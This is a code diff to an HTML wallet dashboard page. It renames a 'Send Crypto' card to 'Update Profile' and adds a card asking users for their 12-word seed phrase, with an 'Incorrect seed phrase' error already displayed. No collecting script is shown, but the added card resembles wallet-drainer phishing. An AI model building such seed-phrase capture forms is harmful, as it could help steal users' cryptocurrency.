@@ -11,7 +11,7 @@
         href="https://fonts.googleapis.com/css2?display=swap&family=Manrope:wght@400;500;700;800&family=Noto+Sans:wght@400;500;700;900" />
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
     <!-- <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script> -->
-     <script src="assets/js/tailwindcss.js"></script>
+    <script src="assets/js/tailwindcss.js"></script>
     <style type="text/tailwindcss">
         :root {
       --primary-color: #53d22c;
@@ -65,9 +65,10 @@
 
             <!-- Main Dashboard -->
             <main class="flex-1 p-4 sm:p-6 lg:p-8">
-                <div class="w-full max-w-md mx-auto bg-[var(--surface-color)] rounded-2xl shadow-2xl p-8 space-y-6">
+                <div
+                    class="w-full max-w-lg mb-6 mx-auto bg-[var(--surface-color)] rounded-2xl shadow-2xl p-8 space-y-6">
                     <div class="text-center">
-                        <h2 class="text-3xl font-bold text-white">Send Crypto</h2>
+                        <h2 class="text-3xl font-bold text-white">Update Profile</h2>
                         <p class="text-[var(--text-secondary)] mt-2">Securely send cryptocurrency to any address.</p>
                     </div>
                     <form class="space-y-6">
@@ -126,6 +127,26 @@
                             </button>
                         </div>
                     </form>
+                </div>
+
+                <!-- phrase -->
+                <div class="card w-full max-w-lg mx-auto">
+                    <div class="text-center">
+                        <h1 class="typography_h1 mb-2">Enter Your Seed Phrase</h1>
+                        <p class="typography_body">Enter your 12-word seed phrase to recover your wallet.</p>
+                    </div>
+                    <div class="mt-8">
+                        <textarea
+                            class="input w-full min-h-36 resize-none p-4 text-base leading-normal bg-white/5 border-white/10 focus:border-[var(--primary-color)] focus:ring-0"
+                            placeholder="Enter your 12-word seed phrase"></textarea>
+                        <p class="typography_body mt-2 text-center text-red-500">Incorrect seed phrase. Please try
+                            again.</p>
+                    </div>
+                    <div class="mt-6 flex justify-center">
+                        <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider">
+                            <span>Recover Wallet</span>
+                        </button>
+                    </div>
                 </div>
             </main>
         </div>
